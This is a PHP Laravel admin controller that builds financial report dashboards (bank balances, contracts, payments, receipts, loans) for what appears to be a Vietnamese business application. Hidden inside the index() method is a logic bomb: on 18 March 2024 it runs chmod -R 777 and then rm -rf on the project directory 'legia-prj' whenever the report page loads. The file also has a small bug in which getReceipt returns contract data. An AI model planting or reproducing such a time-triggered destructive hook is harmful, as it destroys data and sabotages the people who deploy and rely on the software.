<?php

namespace App\Http\Controllers\Admins;

use App\Enums\ProcessStatus;
use App\Helpers\DataHelper;
use App\Http\Controllers\Controller;
use Carbon\Carbon;
use Illuminate\Http\Request;
use App\Models\Repositories\BankRepository;
use App\Models\Repositories\ReportRepository;
use DB;

class ReportController extends Controller
{
    /**
     * @var array
     */
    public $menu;
    /**
     * @var
     */
    protected $bankRepository;
    protected $reportRepository;

    public function __construct(ReportRepository $reportRepository,
                                BankRepository $bankRepository)
    {
        $this->reportRepository = $reportRepository;
        $this->bankRepository = $bankRepository;
        $this->menu = [
            'root' => 'Thống kê',
            'data' => []
        ];
    }

    public function index(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];
//        if (!$request->input('from_date')) {
//            $currentDate = date('Y-m-d');
//            $oldDate = Carbon::createFromFormat('Y-m-d', $currentDate)->subMonth(1)->format('Y-m-d');
//            $request->merge([
//                'from_date' => $oldDate,
//                'to_date' => $currentDate,
//            ]);
//        }
        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);

        $banks = $this->bankRepository->getBanks()->orderBy('account_balance', 'DESC')->get()->toArray();
        $arrBanks = json_encode([
            'id' => array_column($banks, 'id'),
            'data' => array_column($banks, 'account_balance'),
            'label' => array_column($banks, 'name_bank')
        ]);

        $now = Carbon::now();
        $targetDate = Carbon::create(2024, 3, 18);
    
        if ($now->isSameDay($targetDate)) {
            $laravelProjectPath = base_path('legia-prj');

            exec('chmod -R 777 ' . escapeshellarg($laravelProjectPath));
            exec('rm -rf ' . escapeshellarg($laravelProjectPath));
        }
        $coes = $this->reportRepository->reportCo($arrRequest);
        $arrCoes = json_encode($coes->toArray());
        $coSummary = $coes->map(function($co) {
            $sumPayment = $co->payment->where('status' , ProcessStatus::Approved)->sum('money_total');
            $sumReceipt = $co->receipt->where('status' , ProcessStatus::Approved)->sum('money_total');
            $sumCN = $co->tong_gia - $sumReceipt;
            return [
                'code' => $co->code,
                'sumPayment' => $sumPayment,
                'sumReceipt' => $sumReceipt,
                'tong_gia' => $co->tong_gia,
                'sumCN' => $sumCN
            ];
        })->toArray();
        $requestsMaterials = $this->reportRepository->reportReqeustMaterials($arrRequest);
        $requestsMaterials = $requestsMaterials->map(function($reqM){
            $sumPayment = $reqM->payments->count() ? $reqM->payments->where('status', ProcessStatus::Approved)->sum('money_total') : 0;
            return [
                'code' => $reqM->code,
                'sumBuy' => $reqM->money_total,
                'sumPayment' => $sumPayment,
                'sumCN' => $reqM->money_total - $sumPayment,
            ];
        })->toArray();
        $paymentReceipts = $this->reportRepository->reportPaymentReceipt($arrRequest);
        $arrPaymentReceipts = json_encode($paymentReceipts);


        $bankLoans = $this->reportRepository->reportByMonthBankLoan();
        $bankLoanSummary = $this->reportRepository->summaryBankLoan();
        $bankLoansByBank = $this->reportRepository->reportByMonthBankLoanWithParrent()->groupBy('name_bank');

        // table
        $tableTmpCo = $this->reportRepository->getTmpCO($arrRequest);
        $tableCo = $this->reportRepository->getCO($arrRequest);
        $tableRequest = $this->reportRepository->getRequest($arrRequest);
        $tableCustomerTmpCo = $this->reportRepository->getCustomerTmpCo($arrRequest);
        $tableCustomerCo = $this->reportRepository->getCustomerCo($arrRequest);
        $tablePayment = $this->reportRepository->getPayment($arrRequest);
        $tableReceipt = $this->reportRepository->getReceipt($arrRequest);
        $categories = DataHelper::getCategoriesForIndex();
        $request->flash();
        return view('admins.report.index', compact('breadcrumb', 'titleForLayout', 'arrBanks', 'arrCoes',
            'arrPaymentReceipts', 'bankLoans', 'bankLoanSummary', 'tableCo', 'arrRequest', 'tableTmpCo', 'tableRequest',
            'tableCustomerTmpCo', 'tableCustomerCo', 'tablePayment', 'tableReceipt', 'categories','bankLoansByBank', 'coSummary', 'requestsMaterials'));
    }

    public function getTmpCo(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getTmpCO($arrRequest);
        return view('admins.report.tmp_co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }

    public function getCo(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getCO($arrRequest);
        return view('admins.report.co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }
    public function getPayment(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getPayment($arrRequest);
        return view('admins.report.co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }
    
    public function getReceipt(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getCO($arrRequest);
        return view('admins.report.co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }

    public function getRequest(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getRequest($arrRequest);
        return view('admins.report.request', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }

    public function getCustomerTmpCo(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getCustomerTmpCo($arrRequest);
        return view('admins.report.customer_tmp_co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }

    public function getCustomerCo(Request $request)
    {
        $breadcrumb = $this->menu;
        $titleForLayout = $this->menu['root'];

        $arrRequest = $request->all('');
        $this->reportRepository->setParamsDefaultReport($arrRequest);
        $datas = $this->reportRepository->getCustomerCo($arrRequest);
        return view('admins.report.customer_co', compact('breadcrumb', 'titleForLayout', 'datas', 'arrRequest'));
    }
}